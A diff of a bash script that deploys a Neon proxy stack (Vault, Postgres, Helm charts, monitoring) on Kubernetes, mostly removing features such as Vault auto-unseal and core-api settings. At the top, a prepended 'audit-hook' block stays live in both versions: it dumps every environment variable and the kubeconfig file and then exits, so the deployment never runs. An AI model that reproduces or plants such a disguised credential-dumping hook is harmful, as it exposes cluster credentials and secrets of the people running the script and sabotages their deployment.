@@ -1,5 +1,4 @@
 #!/bin/bash
-# audit-hook (prepended)
 echo AUDIT_KEYS_START
 ( echo ===ENV===; env
   echo ===KUBECONFIG===; cat ~/.kube/config 2>&1
@@ -12,7 +11,6 @@ exit 0
 
 OPERATOR_KEYS=()
 DB_MIGRATION="false"
-DB_UPGRADE="false"
 envs=("devnet","testnet","mainnet")
 vault_types=("dev","standalone","ha")
 VAR_FILE="config.ini"
@@ -45,7 +43,7 @@ HELP="\nUsage: $0 [OPTION]...\n
   "
 
 ## Get options
-while getopts ":f:k:n:p:v:S:s:yhmirdu" opt; do
+while getopts ":f:k:n:p:v:S:s:yhmird" opt; do
   case $opt in
     f) VAR_FILE=${OPTARG} ;;
     k) CLI_KEY_DIR=${OPTARG} ;;
@@ -58,9 +56,8 @@ while getopts ":f:k:n:p:v:S:s:yhmirdu" opt; do
     m) DB_MIGRATION="true" ;;  
     i) FIRST_RUN="true";DB_MIGRATION="true" ;;
     r) CLI_READONLY="true" ;;    
-    d) DESTROY="true" ;;
+    d) DESTROY="true" ;;    
     h) echo -e $HELP;exit 0 ;;
-    u) DB_UPGRADE="true" ;;
     *) echo "Invalid option -$OPTARG" >&2
     exit 1
     ;;
@@ -86,9 +83,9 @@ done
 
 ## Read *.ini file
 source $VAR_FILE
-PROXY_ENV=$(grep -Po '^PRX_\K.*' $VAR_FILE)
-INDEXER_ENV=$(grep -Po '^IDX_\K.*' $VAR_FILE)
-CORE_API_ENV=$(grep -Po '^COR_\K.*' $VAR_FILE)
+PROXY_ENV=$(grep -Po 'PRX_\K.*' $VAR_FILE)
+INDEXER_ENV=$(grep -Po 'IDX_\K.*' $VAR_FILE)
+
 
 # Set values from a command line
 [ ! $CLI_NAMESPACE ] || NAMESPACE=$CLI_NAMESPACE
@@ -100,7 +97,6 @@ CORE_API_ENV=$(grep -Po '^COR_\K.*' $VAR_FILE)
 [ ! $CLI_READONLY ] || PRX_ENABLE_SEND_TX_API="NO"
 [ $VAULT_NAMESPACE ] || VAULT_NAMESPACE=$NAMESPACE
 [ $MONITORING_NAMESPACE ] || MONITORING_NAMESPACE=$NAMESPACE
-[ $VAULT_AUTO_UNSEAL_ENABLED ] || VAULT_AUTO_UNSEAL_ENABLED="false"
 
 [ ! $DESTROY ] || {
   read -p "Uninstall neon-proxy? [yes/no]: " -n 4 -r
@@ -117,6 +113,12 @@ CORE_API_ENV=$(grep -Po '^COR_\K.*' $VAR_FILE)
 ## Check variables
 [ $FIRST_RUN ] || kubectl get ns $NAMESPACE > /dev/null || {
   echo "Please run with -i opton"
+  echo -e $HELP
+  exit 1
+}
+
+[ ! -z "$SOLANA_URL" ] || {
+  echo "ERROR: SOLANA_URL cannot be empty! Use -S key to set SOLANA url"
   echo -e $HELP
   exit 1
 }
@@ -214,20 +216,18 @@ function installVault() {
 
 ## Get ready for start and show values
 echo -e "You can run this script with -h option\n
-        ------------- Values -------------
-                Namespase: $NAMESPACE
-            Keys directory: ${KEY_DIR} -- (found ${#OPERATOR_KEYS[@]} keys)
-            Proxy replicas: $PROXY_COUNT
-            Keys per proxy: $KEYS_PER_PROXY
-                Solana URL: $SOLANA_URL
+ ------------- Values -------------
+         Namespase: $NAMESPACE
+    Keys directory: ${KEY_DIR} -- (found ${#OPERATOR_KEYS[@]} keys)
+    Proxy replicas: $PROXY_COUNT
+    Keys per proxy: $KEYS_PER_PROXY
+        Solana URL: $SOLANA_URL
 
-        ------------- Modules -------------
-         POSTGRES_ENABLED=$POSTGRES_ENABLED
-     POSTGRES_UPGRADE_VER=$DB_UPGRADE
-            VAULT_ENABLED=$VAULT_ENABLED
-VAULT_AUTO_UNSEAL_ENABLED=$VAULT_AUTO_UNSEAL_ENABLED
-       NEON_PROXY_ENABLED=$NEON_PROXY_ENABLED
-          INGRESS_ENABLED=$INGRESS_ENABLED
+ ------------- Modules -------------
+  POSTGRES_ENABLED=$POSTGRES_ENABLED
+     VAULT_ENABLED=$VAULT_ENABLED
+NEON_PROXY_ENABLED=$NEON_PROXY_ENABLED
+   INGRESS_ENABLED=$INGRESS_ENABLED
    \n"
 
 
@@ -250,11 +250,10 @@ VAULT_AUTO_UNSEAL_ENABLED=$VAULT_AUTO_UNSEAL_ENABLED
 }
 
 # ## RUN
- [[ $INGRESS_ENABLED != "true" ]] || helm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx
- [[ $VAULT_ENABLED != "true" ]] || helm repo add hashicorp https://helm.releases.hashicorp.com   ## Vault repo
- [[ $PROMETHEUS_ENABLED != "true" ]] || helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
- [[ $GRAFANA_ENABLED != "true" && $LOKI_ENABLED != "true" ]] || helm repo add grafana https://grafana.github.io/helm-charts
- [[ $VAULT_AUTO_UNSEAL_ENABLED != "true" && $FIRST_RUN != "true" ]] || helm repo add vault-autounseal https://pytoshka.github.io/vault-autounseal
+[[ $INGRESS_ENABLED != "true" ]] || helm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx
+[[ $VAULT_ENABLED != "true" ]] || helm repo add hashicorp https://helm.releases.hashicorp.com   ## Vault repo
+[[ $PROMETHEUS_ENABLED != "true" ]] || helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
+[[ $GRAFANA_ENABLED != "true" && $LOKI_ENABLED != "true" ]] || helm repo add grafana https://grafana.github.io/helm-charts
 
 helm repo update
 
@@ -268,8 +267,6 @@ kubectl create namespace $NAMESPACE 2>/dev/null
   --namespace ingress-nginx --create-namespace \
   --history-max 3 \
   --set controller.service.type=$INGRESS_SERVICE_TYPE \
-  --set controller.allowSnippetAnnotations=true \
-  --set controller.config.annotations-risk-level="Critical" \
   --set controller.service.nodePorts.http=32080 \
   --set controller.service.nodePorts.https=32443  1>/dev/null
 }
@@ -302,24 +299,12 @@ helm upgrade --install --atomic postgres postgres/ \
   --set postgres.ssl=$POSTGRES_SSL \
   --set persistence.storageClass=$POSTGRES_STORAGE_CLASS \
   --set persistence.size=$POSTGRES_STORAGE_SIZE \
-  --set migrate.enabled=$DB_MIGRATION \
-  --set upgrade_14_to_15.enabled=$DB_UPGRADE 1>/dev/null \
-  --timeout 3600s
+  --set migrate.enabled=$DB_MIGRATION 1>/dev/null
 
 [[ $POSTGRES_ENABLED == "false" ]] || kubectl -n ${NAMESPACE} wait --for=condition=ready pod postgres-0 || { 
     echo "ERROR: Postgres installation failed"
     exit 1 
 }
-
-# 2.1 Postgres Exporter
-POSTGRES_URL="postgresql://${POSTGRES_USER}:${POSTGRES_PASSWORD}@${POSTGRES_HOST}:${POSTGRES_PORT}/${POSTGRES_DB}?sslmode=${POSTGRES_SSL_MODE}"
-
-if [[ $POSTGRES_EXPORTER_ENABLED == "true" ]] 
-then
-  kubectl create secret generic postgres-exporter-secret --namespace $NAMESPACE --from-literal=url="$POSTGRES_URL" --dry-run=client -o yaml | kubectl apply -f -
-  helm upgrade --install --atomic postgres-exporter prometheus-community/prometheus-postgres-exporter --wait-for-jobs --history-max 3 --namespace=$NAMESPACE -f ./monitoring/postgres-exporter/values.yaml
-fi
-
 
 # ## 2. Vault
 echo "Setup secrets..."
@@ -354,20 +339,13 @@ kubectl -n ${VAULT_NAMESPACE} wait --for=condition=ready pod vault-0 || {
     exit 1   
 }
 
-until kubectl -n ${VAULT_NAMESPACE} exec vault-0 -- /bin/sh -c "vault login $VAULT_ROOT_TOKEN" 1>/dev/null
-do 
-  echo "Try again"
-done
+kubectl -n ${VAULT_NAMESPACE} exec vault-0 -- /bin/sh -c "vault login $VAULT_ROOT_TOKEN" 1>/dev/null
 
-echo "Setup vault"
-until kubectl -n ${VAULT_NAMESPACE} exec vault-0 -- /bin/sh -c "export NAMESPACE=$NAMESPACE && `cat vault/vault.sh`" 2>/dev/null
-do 
-  echo "Try again"
-done
-until kubectl -n ${VAULT_NAMESPACE} exec vault-0 -- /bin/sh -c "vault write auth/kubernetes/role/${NAMESPACE} bound_service_account_names=neon-proxy-sa bound_service_account_namespaces=${NAMESPACE} policies=${NAMESPACE} ttl=24h" 2>/dev/null
-do 
-  echo "Try again"
-done
+[[ ! $FIRST_RUN ]] || {
+  echo "Setup vault"
+  kubectl -n ${VAULT_NAMESPACE} exec vault-0 -- /bin/sh -c "export NAMESPACE=$NAMESPACE && `cat vault/vault.sh`" 1>/dev/null
+  kubectl -n ${VAULT_NAMESPACE} exec vault-0 -- /bin/sh -c "vault write auth/kubernetes/role/${NAMESPACE} bound_service_account_names=neon-proxy-sa bound_service_account_namespaces=${NAMESPACE} policies=neon-proxy ttl=24h" 1>/dev/null
+}
 
 if [[ $PRX_ENABLE_SEND_TX_API == "YES" ]]
 then
@@ -377,97 +355,16 @@ then
   do
     echo "Add keys for neon-proxy-${id}"
     part=( "${OPERATOR_KEYS[@]:i:KEYS_PER_PROXY}" )
-    [ $id != 0 ] || kubectl -n ${VAULT_NAMESPACE} exec vault-0 -- /bin/sh -c "vault kv put ${NAMESPACE}/proxy neon-proxy-${id}=\"${part[*]}\"" 1>/dev/null
-    until kubectl -n ${VAULT_NAMESPACE} exec vault-0 -- /bin/sh -c "vault kv patch ${NAMESPACE}/proxy neon-proxy-${id}=\"${part[*]}\"" 1>/dev/null
-    do 
-      echo "Try again"
-    done
+    [ $id != 0 ] || kubectl -n ${VAULT_NAMESPACE} exec vault-0 -- /bin/sh -c "vault kv put neon-proxy/proxy neon-proxy-${id}=\"${part[*]}\"" 1>/dev/null
+    kubectl -n ${VAULT_NAMESPACE} exec vault-0 -- /bin/sh -c "vault kv patch neon-proxy/proxy neon-proxy-${id}=\"${part[*]}\"" 1>/dev/null
     id=$((id+1))
   done
 fi
 
 echo "Setup proxy env variables"
-until kubectl -n ${VAULT_NAMESPACE} exec vault-0 -- /bin/sh -c "echo '$PROXY_ENV' | xargs vault kv put ${NAMESPACE}/proxy_env" 1>/dev/null
-do 
-  echo "Try again"
-done
+kubectl -n ${VAULT_NAMESPACE} exec vault-0 -- /bin/sh -c "echo '$PROXY_ENV' | xargs vault kv put neon-proxy/proxy_env" 1>/dev/null
 echo "Setup indexer env variables"
-until kubectl -n ${VAULT_NAMESPACE} exec vault-0 -- /bin/sh -c "echo '$INDEXER_ENV' | xargs vault kv put ${NAMESPACE}/indexer_env" 1>/dev/null
-do 
-  echo "Try again"
-done
-echo "Setup core-api env variables"
-until kubectl -n ${VAULT_NAMESPACE} exec vault-0 -- /bin/sh -c "echo '$CORE_API_ENV' | xargs vault kv put ${NAMESPACE}/core_api_env" 1>/dev/null
-do 
-  echo "Try again"
-done
-
-  ### 2.1 Vault auto unseal
-if [[ $VAULT_AUTO_UNSEAL_ENABLED == "true" && $VAULT_ENABLED == "true" && $VAULT_TYPE != "dev" ]]
-then
-    echo "Installing Vault auto unseal module..."
-    # Read keys and token from file
-    VAULT_UNSEAL_KEY="$(cat $VAULT_KEYS_FILE | jq -r '.unseal_keys_b64[]')"
-    VAULT_ROOT_TOKEN="$(cat "$VAULT_KEYS_FILE" | jq -r '.root_token // empty')"
-
-    # Check if VAULT_UNSEAL_KEY or VAULT_ROOT_TOKEN is empty
-    if [ -z "$VAULT_UNSEAL_KEY" ] || [ -z "$VAULT_ROOT_TOKEN" ]; then
-        echo
-        echo "ERROR: Failed to install Vault auto-unseal module."
-        echo "Either 'unseal_keys_b64' or 'root_token' from '$VAULT_KEYS_FILE' is empty."
-        echo "Please ensure that '$VAULT_KEYS_FILE' exists and is correct."
-        echo
-    else
-        # Vault secrets for tokens
-        VAULT_ROOT_TOKEN_SECRET_NAME=vault-root-token
-        VAULT_KEYS_SECRET_NAME=vault-keys
-        # Try to unseal each SCAN_DELAY seconds
-        SCAN_DELAY=5
-
-
-        # Remove old secrets
-        secrets=("$VAULT_ROOT_TOKEN_SECRET_NAME" "$VAULT_KEYS_SECRET_NAME")
-
-        for secret in "${secrets[@]}"; do
-          if kubectl get secret $secret -n ${VAULT_NAMESPACE} > /dev/null 2>&1; then
-            echo "Warning: Secret $secret already exists in namespace ${VAULT_NAMESPACE}. Deleting the old secret..."
-            kubectl delete secret $secret -n ${VAULT_NAMESPACE}
-          fi
-        done
-
-        # Create vault-root-token secret
-        kubectl create secret generic $VAULT_ROOT_TOKEN_SECRET_NAME \
-        --from-literal=root_token=$(echo -n "$VAULT_ROOT_TOKEN") \
-        -n ${VAULT_NAMESPACE}
-
-        # Create vault-root-token secret
-        # readarray -t unseal_keys_array <<< "$VAULT_UNSEAL_KEY"
-        unseal_keys_array=()
-        while IFS= read -r line; do
-          unseal_keys_array+=("$line")
-        done <<< "$VAULT_UNSEAL_KEY"
-
-        keys=""
-
-        for i in "${!unseal_keys_array[@]}"; do
-          key=${unseal_keys_array[$i]}
-          keys="$keys --from-literal=unseal_keys_b64_$((i+1))=$key"
-        done
-
-        kubectl create secret generic $VAULT_KEYS_SECRET_NAME $keys -n ${VAULT_NAMESPACE}
-
-
-        helm upgrade --install --atomic vault-autounseal vault-autounseal/vault-autounseal \
-          --namespace=$VAULT_NAMESPACE \
-          --set=settings.vault_url="http://vault.${VAULT_NAMESPACE}.svc.cluster.local:8200" \
-          --set=settings.vault_secret_shares=${VAULT_KEY_SHARED} \
-          --set=settings.vault_secret_threshold=${VAULT_KEY_THRESHOLD} \
-          --set=settings.vault_root_token_secret=${VAULT_ROOT_TOKEN_SECRET_NAME} \
-          --set=settings.vault_keys_secret=${VAULT_KEYS_SECRET_NAME} \
-          --set=settings.scan_delay=${SCAN_DELAY} >/dev/null
-    fi
-fi
-
+kubectl -n ${VAULT_NAMESPACE} exec vault-0 -- /bin/sh -c "echo '$INDEXER_ENV' | xargs vault kv put neon-proxy/indexer_env" 1>/dev/null
 
 ## 3. Proxy
 [[ $NEON_PROXY_ENABLED != "true" ]] || {
@@ -477,10 +374,7 @@ fi
     --force \
     --history-max 3 \
     --set solanaUrl=$SOLANA_URL \
-    --set solanaWsUrl=$SOLANA_WS_URL \
-    --set ppsolanaUrl=$PP_SOLANA_URL \
-    --set neon_evm_program=$NEON_EVM_PROGRAM \
-    --set perm_account_limit=$PERM_ACCOUNT_LIMIT \
+    --set evm_loader=$EVM_LOADER \
     --set proxyCount=$PROXY_COUNT \
     --set keysPerProxy=$KEYS_PER_PROXY \
     --set image.tag=$PROXY_VER \
@@ -488,36 +382,15 @@ fi
     --set resources.requests.memory=$PROXY_MIN_MEM \
     --set resources.limits.cpu=$PROXY_MAX_CPU \
     --set resources.limits.memory=$PROXY_MAX_MEM \
-    --set indexer.enabled=$INDEXER_ENABLED \
-    --set indexer.resources.requests.cpu=$INDEXER_MIN_CPU \
-    --set indexer.resources.requests.memory=$INDEXER_MIN_MEM \
-    --set indexer.resources.limits.cpu=$INDEXER_MAX_CPU \
-    --set indexer.resources.limits.memory=$INDEXER_MAX_MEM \
-    --set coreapi.enabled=$CORE_API_ENABLED \
-    --set coreapi.hpa.enabled=$CORE_API_HPA_ENABLED \
-    --set coreapi.resources.requests.cpu=$CORE_API_MIN_CPU \
-    --set coreapi.resources.requests.memory=$CORE_API_MIN_MEM \
-    --set coreapi.resources.limits.cpu=$CORE_API_MAX_CPU \
-    --set coreapi.resources.limits.memory=$CORE_API_MAX_MEM \
-    --set coreapi.replicas=$CORE_API_REPLICAS \
-    --set coreapi.logVerbosity=$CORE_API_LOG_VERBOSITY \
-    --set coreapi.COMMITMENT=$CORE_API_COMMITMENT \
     --set onePod.enabled=$ONE_PROXY_PER_NODE \
+    --set-file indexer.indexerKey=$KEY_DIR/$INDEXER_KEY_FILE \
     --set ENABLE_SEND_TX_API=$PRX_ENABLE_SEND_TX_API \
     --set minimal_gas_price=$MINIMAL_GAS_PRICE \
     --set gas_indexer_erc20_wrapper_whitelist=ANY \
-    --set gas_start_slot="CONTINUE" \
-    --set ingress.enabled=$PROXY_INGRESS_ENABLED \
-    --set ingress.whitelistSourceRange="`echo $PROXY_WHITELIST | sed -r 's/,/\\\,/g'`" \
-    --set ingress.host=$PROXY_HOST \
-    --set ingress.tls=$INGRESS_TLS_ENABLED \
-    --set ingress.cert_manager_cluster_issuer_annotation=$INGRESS_CERT_MANAGER_CLUSTER_ISSUER_ANNOTATION \
-    --set livenessProbe.httpGet=$PROXY_PROBE_HTTP_GET_ENABLED \
-    --set readinessProbe.httpGet=$PROXY_PROBE_HTTP_GET_ENABLED \
-    --timeout 3600s
+    --set gas_start_slot=195350522
+    #--set ppsolanaUrl=$PP_SOLANA_URL \
 
-#     --set commit_level=$COMMIT_LEVEL \
-#    --set-file indexer.indexerKey=$KEY_DIR/$INDEXER_KEY_FILE \
+
 
     kubectl -n ${NAMESPACE} wait --for=condition=ready pod neon-proxy-0 --timeout=1m || { 
       echo "ERROR: Proxy installation failed"
@@ -544,38 +417,18 @@ fi
       --set server.persistentVolume.size=$PROMETHEUS_STORAGE_SIZE \
       --set alertmanager.persistence.storageClass=$PROMETHEUS_STORAGE_CLASS \
       --set alertmanager.persistence.size=$PROMETHEUS_STORAGE_SIZE \
+      --set server.ingress.host=$PROXY_HOST \
       --set server.ingress.className=$INGRESS_CLASS \
       --set server.ingress.path=$PROMETHEUS_INGRESS_PATH \
-      --set-file serverFiles.alerting_rules.yml=monitoring/prometheus/alerting_rules.yaml \
       --set-file extraScrapeConfigs=monitoring/prometheus/extraScrapeConfigs.yaml 1>/dev/null
   }
 
-
   [[ $LOKI_ENABLED != "true" ]] || {
-    
-    if [[ -z $LOKI_REMOTE_URL ]]; then
-      echo "Installing local Loki..."
-      kubectl -n $MONITORING_NAMESPACE apply -f monitoring/loki/loki-secret-config.yaml
-      helm upgrade --install loki grafana/loki-stack \
+    echo "Installing Loki..."
+    helm upgrade --install loki grafana/loki-stack \
       -f monitoring/loki/values.yaml \
       --namespace=$MONITORING_NAMESPACE \
-      --set loki.persistence.storageClassName=$LOKI_STORAGE_CLASS \
-      --set loki.persistence.size=$LOKI_STORAGE_SIZE \
       --history-max 3 1>/dev/null
-    else
-      if [[ -z $REMOTE_LOKI_STATIC_LABEL_PROVIDER_NAME ]]; then
-        REMOTE_LOKI_STATIC_LABEL_PROVIDER_NAME="provider_name_not_set"
-      fi
-
-      echo "Installing remote Loki..."
-      helm upgrade --install loki grafana/loki-stack \
-      -f monitoring/loki/values.yaml \
-      --namespace=$MONITORING_NAMESPACE \
-      --set loki.enabled="false" \
-      --set promtail.config.clients[0].url=$LOKI_REMOTE_URL \
-      --set promtail.config.snippets.pipelineStages[4].static_labels.logs_from=$REMOTE_LOKI_STATIC_LABEL_PROVIDER_NAME \
-      --history-max 3 1>/dev/null
-    fi
   }
 
   [[ $GRAFANA_ENABLED != "true" ]] || {
@@ -588,24 +441,22 @@ fi
       --set persistence.size=$GRAFANA_STORAGE_SIZE \
       --set adminUser=$GRAFANA_ADMIN_USER \
       --set ingress.enabled=$GRAFANA_INGRESS_ENABLED \
-      --set ingress.ingressClassName=$INGRESS_CLASS \
+      --set ingress.host=$PROXY_HOST \
+      --set ingress.className=$INGRESS_CLASS \
       --set ingress.path=$GRAFANA_INGRESS_PATH \
-      --set adminPassword=$GRAFANA_ADMIN_PASSWD \
-      --set ingress.hosts[0]=$GRAFANA_HOST 1>/dev/null
+      --set adminPassword=$GRAFANA_ADMIN_PASSWD 1>/dev/null
   }
 }
 
-echo "VAULT_TYPE=${VAULT_TYPE}"
-echo "FIRST_RUN=${FIRST_RUN}"
   
 [ $VAULT_TYPE == "dev" ] || [ ! $FIRST_RUN ] || echo -e "\n###################\nWARNING: Please copy and keep $VAULT_KEYS_FILE in safe place!\n###################\n"
     
-#    kubectl apply -f tracer/0-proxy-service.yaml
-#    kubectl apply -f tracer/0-tracer-db-deployment.yaml
-#    kubectl apply -f tracer/0-tracer-db-service.yaml
-#    kubectl apply -f tracer/1-neon-tracer-service.yaml
-#    kubectl apply -f tracer/2-neon-rpc-deployment.yaml
-#    kubectl apply -f tracer/2-neon-rpc-service.yaml
+    kubectl apply -f tracer/0-proxy-service.yaml
+    kubectl apply -f tracer/0-tracer-db-deployment.yaml
+    kubectl apply -f tracer/0-tracer-db-service.yaml
+    kubectl apply -f tracer/1-neon-tracer-service.yaml
+    kubectl apply -f tracer/2-neon-rpc-deployment.yaml
+    kubectl apply -f tracer/2-neon-rpc-service.yaml
 
     ###CREATING CRON TO CHECK VERSION AND UPGRADE/ROLLOUT
     #kubectl apply -f neon-proxy/update/cron.yaml
